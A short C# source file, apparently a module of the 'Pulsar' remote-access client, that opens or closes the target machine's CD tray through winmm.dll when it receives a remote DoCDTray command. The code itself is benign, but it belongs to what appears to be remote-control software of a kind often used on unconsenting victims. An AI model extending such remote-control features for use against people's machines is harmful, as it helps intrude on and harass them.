using System;
using System.Runtime.InteropServices;
using System.Text;
using Pulsar.Common.Messages.FunStuff;

namespace Pulsar.Client.FunStuff
{
    public class CDTray
    {
        [DllImport("winmm.dll", EntryPoint = "mciSendStringA")]
        private static extern int mciSendString(string command, StringBuilder buffer, int bufferSize, IntPtr hwndCallback);

        public void Handle(DoCDTray message)
        {
            try
            {
                string cmd = message.Open ? "set cdaudio door open" : "set cdaudio door closed";
                mciSendString(cmd, null, 0, IntPtr.Zero);
            }
            catch (Exception ex)
            {
                Console.WriteLine("CDTray error: " + ex.Message);
            }
        }
    }
}
